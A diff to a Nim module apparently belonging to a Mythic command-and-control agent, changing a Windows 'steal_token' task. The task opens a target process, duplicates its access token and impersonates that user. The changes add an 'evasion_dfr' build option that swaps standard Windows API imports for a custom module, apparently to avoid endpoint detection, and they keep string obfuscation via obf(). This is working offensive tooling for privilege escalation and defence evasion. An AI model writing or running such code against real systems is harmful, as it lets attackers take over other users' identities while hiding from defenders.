@@ -5,7 +5,11 @@ import ../utils/strenc
 import token_manager
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except OpenProcess, OpenProcessToken, DuplicateTokenEx, RevertToSelf
+    import ../utils/winapi
+  else:
+    import winim/lean
   
   proc stealToken*(taskId: string, params: JsonNode): JsonNode =
     ## Steal a token from a target process
@@ -19,7 +23,7 @@ when defined(windows):
       except:
         return mythicError(taskId, obf("Invalid PID format: ") & pidStr)
       
-      debug &"[DEBUG] steal_token: PID={pid}"
+      debugLog "steal_token", &"steal_token: PID={pid}"
       
       # Open the target process
       let processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid.DWORD)
@@ -39,13 +43,11 @@ when defined(windows):
       # SecurityImpersonation = 2 (SECURITY_IMPERSONATION_LEVEL enum)
       # TokenImpersonation = 2 (TOKEN_TYPE enum)
       var impersonationToken: HANDLE = 0
-      const SecurityImpersonationLevel = 2.DWORD
-      const TokenImpersonationType = 2.DWORD
       
-      debug &"[DEBUG] About to duplicate token with SecurityLevel={SecurityImpersonationLevel}, TokenType={TokenImpersonationType}"
+      debugLog "steal_token", "About to duplicate token with SecurityImpersonation, TokenImpersonation"
       
-      if DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nil, SecurityImpersonationLevel, 
-                          TokenImpersonationType, addr impersonationToken) == 0:
+      if DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nil, securityImpersonation, 
+                          tokenImpersonation, addr impersonationToken) == 0:
         let errorCode = GetLastError()
         CloseHandle(processToken)
         CloseHandle(processHandle)
@@ -74,7 +76,7 @@ when defined(windows):
       # Get the new user context (after impersonation)
       let newUser = getCurrentUsername()
       
-      debug &"[DEBUG] Successfully stole token from PID {pid}: {newUser}"
+      debugLog "steal_token", &"Successfully stole token from PID {pid}: {newUser}"
       
       # Build response with callback data
       return mythicCallback(taskId, obf("Successfully impersonated ") & newUser & obf(" from PID ") & $pid, %*{
